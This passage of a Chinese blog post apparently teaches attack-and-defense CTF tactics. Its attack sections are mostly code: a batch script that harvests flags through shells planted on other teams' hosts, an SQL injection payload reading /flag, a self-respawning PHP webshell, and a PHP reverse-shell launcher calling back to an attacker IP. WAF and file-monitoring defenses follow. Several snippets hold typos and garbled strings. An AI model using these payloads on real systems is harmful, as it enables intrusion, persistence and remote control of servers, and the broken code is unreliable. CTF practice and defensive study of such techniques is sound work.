class="string">&quot;w&quot;</span>)</span><br><span class="line">f1=oepn(<span class="string">&quot;firstroud_flag.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>[<span class="number">51</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">73</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>]:</span><br><span class="line">	url1=url+str(i)+<span class="string">&quot;:&quot;</span>+port+shell</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		res=requests.post(url1,payload,timeout=<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">if</span> res.status_code == requests.codes.ok:</span><br><span class="line">			<span class="keyword">print</span> url1+<span class="string">&quot; connect shell sucess, flag is &quot;</span>+res.text</span><br><span class="line">			<span class="keyword">print</span> &gt;&gt;f1,url1+<span class="string">&quot; connect shell sucess, flag is &quot;</span>+res.text</span><br><span class="line">			<span class="keyword">print</span> &gt;&gt;f,url1+<span class="string">&quot;,&quot;</span>+passwd</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">&quot;shell not found!&quot;</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> url1+<span class="string">&quot; connect shell fail&quot;</span></span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ol>
+<p>&#x914D;&#x7F6E;&#x4E00;&#x4E0B;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x5730;&#x5740;&#x3001;shell&#x8DEF;&#x5F84;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#xFF0C;&#x53D1;&#x4E86;&#x4E2A;&#x8BB0;&#x5F55;&#x5728;firstround_flag.txt&#x4E2D;&#xFF0C;&#x67D0;&#x6B21;&#x6BD4;&#x8D5B;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://wx3.sinaimg.cn/mw690/006ALkzYgy1fu9cuclrdyj30m40b344h.jpg" alt="flag" title="">
+                </div>
+                <div class="image-caption">flag</div>
+            </figure><p></p>
+<ol start="4">
+<li>&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;<br>&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;&#x5305;&#x62EC;SQL&#x6CE8;&#x5165;&#x3001;&#x6587;&#x4EF6;&#x5305;&#x62EC;&#x3001;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7B49;&#x7B49;&#x3002;&#x5BF9;&#x4E8E;SQL&#x6CE8;&#x5165;&#x7C7B;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x4E00;&#x822C;&#x4E0D;&#x4F1A;&#x6709;&#x8FC7;&#x6EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;<code>sqlmap</code>&#x8DD1;&#x51FA;&#x6765;&#xFF0C;&#x5728;&#x5229;&#x7528;<code>-sql-shell</code>&#x6267;&#x884C;&#xFF0C;<code>select load_file(&apos;/flag&apos;);</code>&#x5373;&#x53EF;&#x5F97;&#x5230;flag&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>into outfile</code>&#x5199;&#x6728;&#x9A6C;&#x7EF4;&#x6301;&#x6743;&#x9650;&#xFF0C;&#x5F39;&#x836F;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230;&#x6743;&#x9650;&#x95EE;&#x9898;&#x3002;&#x7528;<code>sqlmap</code>&#x8DD1;&#x6BD4;&#x8F83;&#x8017;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>payload</code>&#x5199;&#x4E00;&#x4E2A;python&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#xFF1A;<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqli</span><span class="params">(host)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> sess_admin</span><br><span class="line">	date = {<span class="string">&quot;section_name&quot;</span>;<span class="string">&quot;asd&quot;</span>,<span class="string">&quot;admin_name&quot;</span>}:</span><br><span class="line">	<span class="string">&quot; &apos;||(SELECT updatexml(1,concat(0x7e,(select load_file(&apos;/flag&apos;)),0x7e),1))||&apos;&quot;</span>,<span class="string">&quot;announcement&quot;</span>;<span class="string">&quot;asd&quot;</span></span><br><span class="line">	r = sess_admin.post(<span class="string">&apos;http://%s/index.php/section/add&apos;</span>%host,data=data)</span><br><span class="line">	flags = re.findall(<span class="string">r&apos;~(.+?)~&apos;</span>,r.content)</span><br><span class="line">	<span class="keyword">if</span> flags:</span><br><span class="line">		<span class="keyword">return</span> flags[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;error pwn!&quot;</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ol>
+<p>&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#x4E00;&#x822C;&#x4E5F;&#x662F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x9ED1;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#x3001;&#x670D;&#x52A1;&#x5668;&#x89E3;&#x6790;&#x6F0F;&#x6D1E;&#x7B49;&#x7B49;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4E0A;&#x4F20;&#x6728;&#x9A6C;&#xFF1B;</p>
+<h1 id="&#x4E94;&#x3001;&#x6743;&#x9650;&#x7EF4;&#x6301;"><a href="#&#x4E94;&#x3001;&#x6743;&#x9650;&#x7EF4;&#x6301;" class="headerlink" title="&#x4E94;&#x3001;&#x6743;&#x9650;&#x7EF4;&#x6301;"></a>&#x4E94;&#x3001;&#x6743;&#x9650;&#x7EF4;&#x6301;</h1><p>&#x8FD9;&#x91CC;&#x8BF4;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x6BD4;&#x8F83;&#x201C;&#x6405;&#x5C4E;&#x201D;&#x4E86;&#xFF0C;&#x4E0A;&#x9762;&#x8BF4;&#x5230;&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#x53EF;&#x4EE5;&#x7EF4;&#x6301;&#x6743;&#x9650;&#xFF0C;&#x4E3B;&#x8981;&#x54DF;&#x4E24;&#x79CD;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x201C;&#x4E0D;&#x6B7B;&#x9A6C;&#x201D;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x662F;&#x53CD;&#x5F39;shell</p>
+<ul>
+<li><strong>&#x201C;&#x4E0D;&#x6B7B;&#x9A6C;&#x201D;</strong><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	set_time_limit(<span class="number">0</span>);</span><br><span class="line">	ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">	unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>){</span><br><span class="line">		file_put_contents(<span class="string">&apos;./.config.php&apos;</span>,<span class="string">&apos;&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(101).$uU(97.$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(101).$uU(97)?&gt;&apos;</span>);</span><br><span class="line">		system(<span class="string">&apos;chmod 777 .config.php&apos;</span>);</span><br><span class="line">		touch(<span class="string">&quot;./.config.php&quot;</span>,mktime(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">28</span>,<span class="number">2016</span>));</span><br><span class="line">		usleep(<span class="number">100</span>);</span><br><span class="line">	}	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ul>
+<p>&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#xFF0C;&#x4E0A;&#x4F20;&#x4E0A;&#x9762;&#x7684;&#x201C;&#x4E0D;&#x6B7B;&#x9A6C;&#x201C;&#x5E76;&#x8BBF;&#x95EE;&#xFF0C;&#x5C31;&#x4F1A;&#x4E00;&#x76F4;&#x751F;&#x6210;.config.php&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF0C;&#x6728;&#x9A6C;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x81EA;&#x4FEE;&#x4FEE;&#x6539;&#xFF0C;&#x53EA;&#x8981;&#x522B;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x770B;&#x61C2;&#x5C31;&#x884C;&#xFF0C;&#x54C8;&#x54C8;&#x54C8;</p>
+<ul>
+<li><strong>&#x201C;&#x53CD;&#x5F39;shell&#x201D;</strong><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">which</span><span class="params">($pr)</span> </span>{</span><br><span class="line">		$path = excute(<span class="string">&quot;which $pr&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ($path ? $path : $pr);</span><br><span class="line">	}</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">excute</span><span class="params">($cfe)</span> </span>{</span><br><span class="line">		$res = <span class="string">&apos;&apos;</span>;</span><br><span class="line">		<span class="keyword">if</span> ($cfe) {</span><br><span class="line">		<span class="keyword">if</span>(function_exists(<span class="string">&apos;exec&apos;</span>)) {</span><br><span class="line">			@exec($cfe,$res);</span><br><span class="line">			$res = join(<span class="string">&quot;\n&quot;</span>,$res);</span><br><span class="line">		} <span class="keyword">elseif</span> (function_exists(<span class="string">&apos;shell_exec&apos;</span>)) {</span><br><span class="line">			$res = @shell_exec($cfe);</span><br><span class="line">		} <span class="keyword">elseif</span>(function_exists(<span class="string">&apos;system&apos;</span>)) {</span><br><span class="line">			@ob_start();</span><br><span class="line">			@system($cfe);</span><br><span class="line">			$res = @ob_get_contents();</span><br><span class="line">			@ob_end_clean();</span><br><span class="line">		} <span class="keyword">elseif</span> (function_exists(<span class="string">&apos;passthru&apos;</span>)) {</span><br><span class="line">			@ob_start();</span><br><span class="line">			@passthru($cfe);</span><br><span class="line">			$res = @ob_get_contents();</span><br><span class="line">			@ob_end_clean();</span><br><span class="line">		} <span class="keyword">elseif</span> (@is_resource($f = @popen($cfe,<span class="string">&quot;r&quot;</span>))) {</span><br><span class="line">			$res = @fread($f, <span class="number">1024</span>);</span><br><span class="line">		}</span><br><span class="line">		@pclose($f);</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">return</span> $res;</span><br><span class="line">	}</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">cf</span><span class="params">($name,$text)</span></span>{</span><br><span class="line">		<span class="keyword">if</span>($fp=@fopen($fname, <span class="string">&apos;w&apos;</span>)) {</span><br><span class="line">			$fputs($fp,@base64_decode($text));</span><br><span class="line">			@fclose($fp);</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">	$yourip = <span class="string">&quot;192.168.71.1&quot;</span>;</span><br><span class="line">	$yourport = <span class="string">&apos;9999&apos;</span>;</span><br><span class="line">	$usedb = <span class="keyword">array</span>(<span class="string">&apos;per&apos;</span>=&gt;<span class="string">&apos;perl&apos;</span>,<span class="string">&apos;c&apos;</span>=&gt;<span class="string">&apos;c&apos;</span>);</span><br><span class="line">	$back_connect=<span class="string">&quot;...&quot;</span></span><br><span class="line">	cf(<span class="string">&apos;/tmp/.bc&apos;</span>,$back_connect);</span><br><span class="line">	$res = execute(which(<span class="string">&apos;perl&apos;</span>)<span class="string">&quot; /tmp/.db $yourip $yourport &amp;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ul>
+<p>&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#x4E0A;&#x4F20;&#x4E0A;&#x9762;&#x7684;php&#x6587;&#x4EF6;&#x5E76;&#x8BBF;&#x95EE;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x7528;nc&#x53CD;&#x5F39;shell&#xFF0C;&#x4E4B;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x4E00;&#x76F4;&#x5F97;&#x5206;&#x4E86;<br></p><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://wx1.sinaimg.cn/mw690/006ALkzYly1fu9m5f56s3j30lz0edtdi.jpg" alt="php" title="">
+                </div>
+                <div class="image-caption">php</div>
+            </figure><br>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x4E0A;&#x9762;&#x7684;2&#x4E2D;&#x65B9;&#x6CD5;&#xFF0C;&#x9700;&#x8981;&#x7F51;&#x7AD9;&#x7684;&#x6743;&#x9650;&#x4E3A;www-data,&#x5982;&#x679C;&#x7F51;&#x7AD9;&#x7684;&#x6743;&#x9650;&#x662F;ctf&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x6CA1;&#x6709;&#x6743;&#x9650;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x3002;<p></p>
+<h1 id="&#x516D;&#x3001;-&#x901A;&#x7528;&#x9632;&#x5FA1;"><a href="#&#x516D;&#x3001;-&#x901A;&#x7528;&#x9632;&#x5FA1;" class="headerlink" title="&#x516D;&#x3001; &#x901A;&#x7528;&#x9632;&#x5FA1;"></a>&#x516D;&#x3001; &#x901A;&#x7528;&#x9632;&#x5FA1;</h1><p>&#x5BF9;&#x4E8E;&#x9632;&#x5FA1;&#xFF0C;&#x4E00;&#x822C;&#x901A;&#x7528;&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#xFF1A;WAF&#x3001;&#x6587;&#x4EF6;&#x76D1;&#x63A7;<br><strong>1. WAF</strong></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://wx1.sinaimg.cn/mw690/006ALkzYly1fu9mac2q97j30lx0eidqt.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu9maehbaqj30mg0bp0xj.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;</p>
+<ol>
+<li>&#x5C06;waf.php&#x4F20;&#x5230;&#x8981;&#x5305;&#x542B;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;</li>
+<li>&#x5728;&#x9875;&#x9762;&#x4E2D;&#x52A0;&#x5165;&#x9632;&#x62A4;&#xFF0C;&#x54DF;&#x4E24;&#x79CD;&#x505A;&#x6CD5;&#xFF0C;&#x6839;&#x636E;&#x60C5;&#x51B5;&#x4E8C;&#x9009;&#x4E00;&#x5373;&#x53EF;&#xFF1A;<br>a).&#x5728;&#x6240;&#x9700;&#x8981;&#x9632;&#x62A4;&#x7684;&#x9875;&#x9762;&#x52A0;&#x5165;&#x4EE3;&#x7801;<br><code>require_once(&apos;waf.php&apos;);</code><br>&#x5C31;&#x53EF;&#x4EE5;&#x505A;&#x5230;&#x9875;&#x9762;&#x9632;&#x6CE8;&#x5165;&#x3001;&#x8DE8;&#x7AD9;<br>&#x5982;&#x679C;&#x60F3;&#x6574;&#x7AD9;&#x9632;&#x6CE8;&#xFF0C;&#x5C31;&#x5728;&#x7F51;&#x7AD9;&#x7684;&#x4E00;&#x4E2A;&#x516C;&#x7528;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x5982;&#x6570;&#x636E;&#x5E93;&#x94FE;&#x63A5;&#x6587;&#x4EF6;config.icn.php&#x4E2D;&#xFF01;<br>&#x6DFB;&#x52A0;<code>require_once(&apos;waf.php&apos;);</code>&#x6765;&#x8C03;&#x7528;&#x4EE3;&#x7801;<br>&#x5E38;&#x7528;php&#x7CFB;&#x7EDF;&#x6DFB;&#x52A0;&#x6587;&#x4EF6;</li>
+</ol>
+<blockquote>
+<p>PHPCMS v9 \phpcms\base.php<br>PHPWIND8.7 \data\sql_config.php<br>DEDECMS 5.7 \data\common.inc.php<br>Discuz X2 \config\config.php_global.php<br>WordPress \wp-config.php<br>Metinfo \include\head.php</p>
+</blockquote>
+<p>b). &#x5728;&#x6BCF;&#x4E2A;&#x6587;&#x4EF6;&#x6700;&#x524D;&#x52A0;&#x4E0A;&#x4EE3;&#x7801;<br>&#x5728;<code>php.ini</code>&#x4E2D;&#x627E;&#x5230;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Automaticaly add files before or after any PHP document.</span><br><span class="line">auto_prepend_file = 360_safe3.php&#x8DEF;&#x5F84;&#xFF1B;</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x90E8;&#x7F72;waf&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x4E0D;&#x53EF;&#x7528;&#xFF0C;&#x9700;&#x8981;&#x8C28;&#x614E;&#x90E8;&#x7F72;&#x3002;</p>
+<p><strong>2. &#x6587;&#x4EF6;&#x76D1;&#x63A7;</strong><br>&#x6587;&#x4EF6;&#x76D1;&#x63A7;&#x53EF;&#x4EE5;&#x5BF9;web&#x76EE;&#x5F55;&#x8FDB;&#x884C;&#x76D1;&#x63A7;&#xFF0C;&#x53D1;&#x73B0;&#x65B0;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x6216;&#x8005;&#x88AB;&#x4FEE;&#x6539;&#x7ACB;&#x5373;&#x6062;&#x590D;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x9632;&#x6B62;&#x4E0A;&#x4F20;shell&#x7B49;&#x653B;&#x51FB;&#xFF1A;<br></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#use: python file_check.py ./</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> ntpath</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = {}	<span class="comment">#&#x6587;&#x4EF6;MD5&#x5B57;&#x5178;</span></span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#x7279;&#x6B8A;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">Special_path_str = <span class="string">&apos;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&apos;</span></span><br><span class="line">bakstring = <span class="string">&apos;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&apos;</span></span><br><span class="line">logstring = <span class="string">&apos;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&apos;</span></span><br><span class="line">webshellstring = <span class="string">&apos;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&apos;</span></span><br><span class="line">difffile = <span class="string">&apos;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&apos;</span></span><br><span class="line"></span><br><span class="line">Special_string = <span class="string">&apos;drops_log&apos;</span>	<span class="comment">#&#x514D;&#x6B7B;&#x91D1;&#x724C;</span></span><br><span class="line">UNICODE_ENCODEING = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r&quot;\?%02x&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x5B57;&#x5178;</span></span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD,Special_path_str))</span><br><span class="line">Special_path = {</span><br><span class="line"><span class="string">&apos;bak&apos;</span> : os.path.realpath(os.path.join(spec_base_path,bakstring)),</span><br><span class="line"><span class="string">&apos;log&apos;</span> : os.path.realpath(os.path.join(spec_base_path,logstring)),</span><br><span class="line"><span class="string">&apos;webshell&apos;</span> : os.path.realpath(os.path.join(spec_base_path,webshellstring)),</span><br><span class="line"><span class="string">&apos;diffile&apos;</span> : os.path.realpath(os.path.join(spec_base_path,diffile)),</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isListLike</span><span class="params">(value)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> isinstance(value, (list, tuple, set))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x83B7;&#x53D6;Unicode&#x7F16;&#x7801;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUnicode</span><span class="params">(value, encoding=None, noneToNull=False)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> noneTuNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">		<span class="keyword">return</span> noneTuNull</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> isListLike(value):</span><br><span class="line">		value = list(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</span><br><span class="line">		<span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> isinstance(value,unicode):</span><br><span class="line">		<span class="keyword">return</span> value</span><br><span class="line">	<span class="keyword">elif</span> isinstance(value, basestring):</span><br><span class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				<span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</span><br><span class="line">			<span class="keyword">except</span> UnicodeDecodeError, ex:</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">					<span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</span><br><span class="line">				<span class="keyword">except</span>:</span><br><span class="line">					value = value[:ex.start]+<span class="string">&quot;&quot;</span>.join(INVALID_UNICODE_CAHR_FORMAT % ord(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="keyword">return</span> unicode(value)</span><br><span class="line">		<span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">			<span class="keyword">return</span> unicode(str(value), errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x76EE;&#x5F55;&#x521B;&#x5EFA;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir_p</span><span class="params">(path)</span>:</span></span><br><span class="line">	<span class="keyword">import</span> errno</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		os.makedirs(path)</span><br><span class="line">	<span class="keyword">except</span> OSRrror <span class="keyword">as</span> exc:</span><br><span class="line">		<span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line">		<span class="keyword">else</span>: <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 